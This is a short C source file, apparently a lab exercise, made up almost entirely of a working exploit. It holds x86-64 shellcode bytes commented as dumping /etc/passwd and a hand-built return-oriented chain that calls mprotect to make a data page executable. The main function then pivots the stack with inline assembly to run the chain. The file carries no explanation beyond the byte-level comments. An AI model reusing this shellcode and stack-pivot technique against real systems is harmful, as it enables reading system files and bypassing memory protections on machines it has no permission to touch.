#include <stdio.h>
#define N 256

enum{
    Sz = 8 * 1024,
};

char shellcode[Sz] = {
    // shellcode to dump /etc/passwd
    0x49, 0xbd, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0x10,
    0x49, 0xc1, 0xed, 0x34, 0x4c, 0x29, 0xec, 0x4d, 0x31, 0xe4,
    0x49, 0xba, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x65, 0x74, 0x63,
    0x49, 0xbb, 0xff, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64,
    0x49, 0xc1, 0xeb, 0x08, 0x41, 0x53, 0x41, 0x52, 0x48, 0xb8,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x2f, 0x48, 0xc1,
    0xe8, 0x3c, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xd2, 0x48, 0xbe,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x4f, 0x1a, 0x48, 0xc1,
    0xee, 0x34, 0x0f, 0x05, 0x49, 0x89, 0xc0, 0x4c, 0x39, 0xe0,
    0x7c, 0x64, 0x48, 0x31, 0xc0, 0x4c, 0x89, 0xc7, 0x48, 0x89,
    0xe6, 0x4c, 0x89, 0xea, 0x0f, 0x05, 0x49, 0x89, 0xc1, 0x4c,
    0x39, 0xe0, 0x78, 0x4e, 0x74, 0x26, 0x48, 0xb8, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0x1f, 0x48, 0xc1, 0xe8, 0x3c,
    0x48, 0xbf, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x1f,
    0x48, 0xc1, 0xef, 0x3c, 0x48, 0x89, 0xe6, 0x4c, 0x89, 0xca,
    0x0f, 0x05, 0xeb, 0xc2, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0x3f, 0x48, 0xc1, 0xe8, 0x3c, 0x4c, 0x89,
    0xc7, 0x0f, 0x05, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0x3c, 0x48, 0xc1, 0xe8, 0x38, 0x48, 0x31, 0xff,
    0x0f, 0x05, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0x3c, 0x48, 0xc1, 0xe8, 0x38, 0x48, 0xbf, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0x1f, 0x48, 0xc1, 0xef, 0x3c
};

char newstack[Sz] = {
    0x88, 0xee, 0xe3, 0xf7, 0xff, 0x7f, 0x00, 0x00, // %rax -> 0x7ffff7e3ee88
    0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // %rax = 0xa
    0x96, 0x67, 0xe2, 0xf7, 0xff, 0x7f, 0x00, 0x00, // %rdi -> 0x7ffff7e26796
    0x00, 0x80, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00, // %rdi = 0x555555558000    
    0x0f, 0x89, 0xe2, 0xf7, 0xff, 0x7f, 0x00, 0x00, // %rsi -> 0x7ffff7e2890f
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // %rsi = 0x1000
    0xcd, 0xb1, 0xec, 0xf7, 0xff, 0x7f, 0x00, 0x00, // %rdx -> 0x7ffff7ecb1cd
    0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // %rdx = 0x4
    0x35, 0x41, 0xe8, 0xf7, 0xff, 0x7f, 0x00, 0x00, // syscall -> 0x7ffff7e84135
    0x40, 0x80, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00 // dir. shellcode = 0x555555558040
};

int
main(int argc, char** argv)
{
    printf("hi!\n");
    asm(
        "movq %0, %%rsp\n\t"
        "retq\n\t"
        :
        : "r" (newstack)
    );
}
